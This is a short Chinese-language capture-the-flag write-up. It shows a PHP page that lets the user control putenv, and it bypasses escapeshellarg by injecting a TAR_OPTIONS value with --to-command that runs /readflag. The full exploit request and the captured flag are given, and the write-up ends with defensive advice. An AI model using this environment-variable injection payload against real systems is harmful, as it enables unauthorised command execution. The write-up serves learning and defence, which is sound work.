# We Love The Environment

## 题目简述

PHP 页面允许用户指定一个环境变量和值，再选择要运行的程序：

```php
putenv($_GET['var'] . '=' . $_GET['val']);
passthru(escapeshellarg($_GET['prog']) . ' 2>&1');
```

`escapeshellarg` 只保护程序名不被拼接额外 Shell 语句，却无法阻止被执行程序读取攻击者控制的环境变量。容器中的 `tar` 会解析 `TAR_OPTIONS`，可借其 `--to-command` 功能执行 `/readflag GIVEFLAGPLS`。

## 解题过程

选择程序 `tar`，设置环境变量名为 `TAR_OPTIONS`，值为：

```text
--to-command '/readflag GIVEFLAGPLS' -x -f /lib/apk/db/scripts.tar
```

对应请求参数为：

```text
?prog=tar&var=TAR_OPTIONS&val=--to-command%20%27/readflag%20GIVEFLAGPLS%27%20-x%20-f%20/lib/apk/db/scripts.tar
```

PHP 最终执行的命令行只有安全引用后的 `tar`，但该进程启动时继承恶意 `TAR_OPTIONS`。`tar` 打开指定归档，并在处理成员时执行 `--to-command` 指定的命令，从而调用只接受 `GIVEFLAGPLS` 参数的 `/readflag`。

输出为：

```text
greyhats{I_doNT_l0vE_you_no_m0rE}
```

## 方法总结

- 核心技巧：利用程序专用环境变量注入参数，绕过只对命令名做 Shell 转义的防护。
- 识别信号：用户可控 `putenv`，随后能选择系统程序执行；目标程序支持从环境变量读取额外选项。
- 复用要点：命令参数转义不能约束环境；防守侧应对白名单程序使用固定、干净的环境，并禁止用户控制影响解析行为的变量。
